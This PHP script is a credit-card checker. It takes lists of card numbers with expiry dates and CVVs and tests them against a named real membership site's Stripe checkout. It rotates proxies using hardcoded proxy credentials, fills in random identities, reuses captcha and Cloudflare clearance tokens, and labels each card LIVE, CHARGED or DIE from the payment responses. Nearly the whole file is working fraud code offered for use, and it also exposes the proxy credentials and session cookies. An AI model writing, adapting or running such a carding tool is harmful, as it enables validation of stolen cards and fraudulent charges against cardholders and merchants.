
<?php 
error_reporting(0);
//---------------------------------------//
$mtc_site = "https://www.yogaismedicine.com/membership-account/membership-checkout/" ;
$amt = "accept" ;
//---------------------------------------//

$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
;

//==================[Randomizing Details]======================//
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
//==================[Randomizing Details-END]======================//

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
/////////////===[Proxy]/////////////
$rp1 = array(
  1 => 'kfkqyrol-rotate:jka20abc2877',
  2 => 'ywfmqtbi-rotate:yfcbcbownp9p',
  3 => 'zvynypmx-rotate:wtcclm2u3ozc',
  4 => 'sidryfje-rotate:469fi5zt2yo4',
  5 => 'xpmifrvd-rotate:zt8bndzd1t7x',
  6 => 'lcbjzvjv-rotate:n30hp47rkwpa',
  7 => 'efhauogi-rotate:h28girrhxb3i',
  8 => 'uhzzodzl-rotate:86295azuhrar',
  9 => 'ozzozaxn-rotate:ecxo19jmbtx6',
  10 => 'uhyehnfe-rotate:fz9xfos83uii',
  11 => 'rtkjtbdz-rotate:9rwjgzs7h9hk',
  12 => 'aybkhbcy-rotate:kkx5tyuv8nsf',
  13 => 'eorahscd-rotate:7r67qrdmulm9',
  14 => 'qxbxceqg-rotate:eiopf00jcv8o',
  15 => 'sqbfhwcj-rotate:2p923i50rryc',
  16 => 'woszotux-rotate:uqogr44mzcdr',
  17 => 'jpdszbab-rotate:gplwi9s4pjh6',
  18 => 'dzaeexnk-rotate:mpj03r9u5ujl',
  19 => 'pxumvufh-rotate:no8hpjihgvsy',
  20 => 'kmlasheo-rotate:fmv7lsj498rh',
  21 => 'twlvunvx-rotate:lz8l4ximgkcw',
  22 => 'jdyweald-rotate:e186bbe2dbtp',
  23 => 'rruteeve-rotate:xif2651bh7lv',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];
$ip = array(
  1 => 'socks5://p.webshare.io:80',
  2 => 'http://p.webshare.io:80',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];
$url = "https://api.ipify.org/";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();
if (isset($ip1)){
$ip = "";
}
if (empty($ip1)){
$ip = "";
}
# --------------------[Proxy End]-----------------#

# -------------------- [1 REQ] -------------------#
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_methods',
'scheme: https',
'accept: application/json',
'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][line1]=3324+Chapel+Street&billing_details[address][line2]=&billing_details[address][city]=Sugar+Land&billing_details[address][state]=Texas&billing_details[address][postal_code]=77478&billing_details[address][country]=US&billing_details[name]=jonh+cena&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=f91461be-50e9-4d2c-8704-78a14491800f92d07b&muid=4f05e624-2a86-4c0e-8573-c3ce52cad698a024ec&sid=02c03e7a-eaca-4ac1-ba7d-b2785ae173286f81f2&payment_user_agent=stripe.js%2Fcd4fc6eb02%3B+stripe-js-v3%2Fcd4fc6eb02&time_on_page=50480&key=pk_live_51HCVHxLkA0NPtdtkFXHDzwRorCh8OTx62ksJVYbHnG5zzr9NRwUDvic8Jv6GqcAR6UGJRHMz5JSYdpuOBmw9ciDt008P0J287c');




$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
#$pi = Getstr($result1,'client_secret":"','_secret');

#$src = Getstr($result1,'client_secret":"','"');
# -------------------- [2 REQ] -------------------#

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://www.yogaismedicine.com/membership-account/membership-checkout/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.yogaismedicine.com',
'method: POST',
'path: /membership-account/membership-checkout/',
'scheme: https',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
'content-type: application/x-www-form-urlencoded',
'cookie: cf_chl_2=181aa954ff04690; pmpro_visit=1; cf_chl_rc_m=1; cf_clearance=Dk2iI7DDlIgN_GW80RKY8bfHbgRiSOlBuhJVCKFnFiI-1687064365-0-250; PHPSESSID=691f0f695867ad0a0901e5695ad8408e; __stripe_mid=4f05e624-2a86-4c0e-8573-c3ce52cad698a024ec; __stripe_sid=02c03e7a-eaca-4ac1-ba7d-b2785ae173286f81f2',
'origin: https://www.yogaismedicine.com',
'referer: https://www.yogaismedicine.com/membership-account/membership-checkout?__cf_chl_tk=DwDIz4y2kCHDTG41DPIpy9f4doQxoPpGToLV8BSumaY-1687065326-0-gaNycGzNDJA',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'level=1&checkjavascript=1&username='.$name.'&password=4430450078585337&password2=4430450078585337&bemail='.$email.'&bconfirmemail='.$email.'&fullname=&bfirstname=jonh&blastname=cena&baddress1=3324+Chapel+Street&baddress2=&bcity=Sugar+Land&bstate=Texas&bzipcode=77478&bcountry=US&bphone=281-624-2480&CardType=discover&submit-checkout=1&javascriptok=1&g-recaptcha-response=03AL8dmw8gl-vIIMgJfcqUnejLGHUumULc5yfiV2b1u0EdNN-Gv2UFKxpPA1VxEBT9E4leSOLKuBNC6Z72IlqN6G4Hy6UgpsNEiBOMdIcFw6iqazydt76J5vSpQtYGa1HaxmPJ9W2U9K3v3e2UpikoWe__LfrmcyJ6aDG0v4efDi5miL3EXK3k79LLSLdckpHlrWoBvfH2noGy_kpmQ-tyRA0YDe7RlsnMSFyMVxqyBxYPYT46rHpNJzYoMUxR4dmsUunEu-tS4HmCnHReN8p0BtRTsTQdVBw25yTq6g-ZQLSriFFJR2HDGDM4hc5R3-n38EvHAGZtcf_Kg59J-u9YZEu0ZJtAXhDArQTkQ0oGniVyrQzWkqrz7iwRhxrnU_LyMbHS9H0iDrFIXV3J5ptA0zukQwyVn2-I31qsaL_SulnAQrgHXsSMT4cdATvguAX_G_nNY-oG-Jj1ax1Y-AUbVp51OdfEJ3OR2eqiOnA7_qPWDHsd8EWQ26nfemsNJ6nUzUmGOIZ4OxeoeMs2V7mClX1c-snqfapbhcUnSaeXVD22np18kQUUWKk&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX8664&ExpirationMonth=12&ExpirationYear=2025');



$result2 = curl_exec($ch);
# ---------------------------------------#


# ---------------- [Responses] ----------------- #
if(strpos($result2, "payment_intent_unexpected_state")) {



    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Payment Intent Confirmed ?? '.$ip1.'</span><br>';

    }

elseif(strpos($result2, "succeeded")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ?checker '.$ip1.' </span><br>';
exit;
}

elseif(strpos($result2, "Your card has insufficient funds.")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS ?checker '.$ip1.'  </span><br>';
    exit;
    }



elseif(strpos($result2, "incorrect_zip")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE ?checker '.$ip1.'  </span><br>';
    exit;
    }
    
    elseif(strpos($result2, "Your card has insufficient funds.")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS ?checker '.$ip1.'  </span><br>';
    exit;
    }

elseif(strpos($result2, 'security code is incorrect.')) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: security code is incorrect ?checker '.$ip1.'  </span><br>';
    exit;
    }
    elseif(strpos($result2, 'security code is invalid.')) {

        echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: security code is invalid ?checker '.$ip1.'  </span><br>';
        exit;
        }
    elseif(strpos($result2, "Security code is incorrect")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect ?checker '.$ip1.'  </span><br>';
    }
    
elseif(strpos($result2, "transaction_not_allowed")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result:  transaction_not_allowed ?checker '.$ip1.'   </span><br>';
    exit;
    }
    

elseif(strpos($result2, "stripe_3ds2_fingerprint")) {


    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result:  3D ?checker '.$ip1.'   </span><br>';
    exit;
    }
elseif(strpos($result2, "generic_decline")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINE ? '.$ip1.'</span><br>';
    }

elseif(strpos($result2, "do_not_honor")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR ? '.$ip1.'</span><br>';

}


elseif(strpos($result2, "fraudulent")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT ? '.$ip1.'</span><br>';

}
elseif(strpos($result2, "intent_confirmation_challenge")) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Captcha ?? '.$ip1.'</span><br>';

    }


elseif(strpos($result2, 'Your card was declined.')) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline '.$ip1.'</span><br>';
}

elseif(strpos($result2, 'Error updating default payment method. Your card was declined.')) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline '.$ip1.'</span><br>';
}

elseif(strpos($result2, '"cvc_check": "pass"')) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ?checker '.$ip1.'  </span><br>';
exit;
}

elseif(strpos($result2, "Membership Confirmation")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result: Membership Confirmation '.$amt.' ?checker '.$ip1.' </span><br>';
exit;
}

elseif(strpos($result2, "Thank you for your support!")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ?checker '.$ip1.' </span><br>';
exit;
}

elseif(strpos($result2, "Thank you for your donation")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ?checker '.$ip1.' </span><br>';
exit;
}

elseif(strpos($result2, "/wishlist-member/?reg=")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ?checker '.$ip1.' </span><br>';
exit;
}

elseif(strpos($result2, "Thank You For Donation.")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ?checker '.$ip1.' </span><br>';
exit;
}

elseif(strpos($result2, "Thank You")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ?checker '.$ip1.' </span><br>';
exit;
}

elseif(strpos($result2, "incorrect_cvc")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CCN LIVE ?checker '.$ip1.'   </span><br>';
exit;
}

elseif(strpos($result2, "Card is declined by your bank, please contact them for additional information.")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ?checker '.$ip1.'  </span><br>';
exit;
}

elseif(strpos($result2, "Your card does not support this type of purchase.")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ?checker '.$ip1.'  </span><br>';
exit;
}

elseif(strpos($result2, "Your card is not supported.")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CARD NOT SUPPORTED '.$ip1.' </span><br>';
exit;
}


else {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED ? '.$ip1.'</span><br>';

}



curl_close($ch);
ob_flush();
#echo $result1;
#echo $result2; 
?>